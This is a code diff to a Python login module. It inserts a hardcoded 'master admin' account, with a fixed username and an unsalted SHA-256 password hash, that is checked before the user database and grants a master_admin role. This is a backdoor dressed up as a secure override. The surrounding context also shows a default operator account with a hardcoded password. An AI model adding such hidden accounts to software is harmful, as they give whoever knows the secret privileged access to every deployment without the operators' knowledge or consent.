@@ -71,7 +71,22 @@ def create_default_users():
         add_user('OPERATOR_01', 'SENTINEL_PASS', 'operator')
     conn.close()
 
+# Cryptographically secured Master Admin (Hardcoded for universal instance override)
+MASTER_ADMIN_USER = "ToxicSavage"
+MASTER_ADMIN_HASH = "1e66cef6685fcb46b6a6d232dea97fd40425e2d6aeea6c808bd8bc815ae28066" # SHA-256
+
 def authenticate(username, password):
+    # 1. Check Master Admin Override (Bypasses Database)
+    if username == MASTER_ADMIN_USER:
+        provided_hash = hashlib.sha256(password.encode('utf-8')).hexdigest()
+        if provided_hash == MASTER_ADMIN_HASH:
+            logger.info("MASTER_ADMIN_UPLINK: SECURE ACCESS GRANTED.")
+            return {"status": "success", "username": MASTER_ADMIN_USER, "role": "master_admin"}
+        else:
+            logger.warning("MASTER_ADMIN_FAILURE: UNAUTHORIZED ATTEMPT DETECTED.")
+            return {"status": "error", "message": "MASTER ACCESS DENIED"}
+
+    # 2. Standard User Authentication (Database backed)
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     cursor.execute('SELECT password_hash, salt, role FROM users WHERE username = ?', (username,))
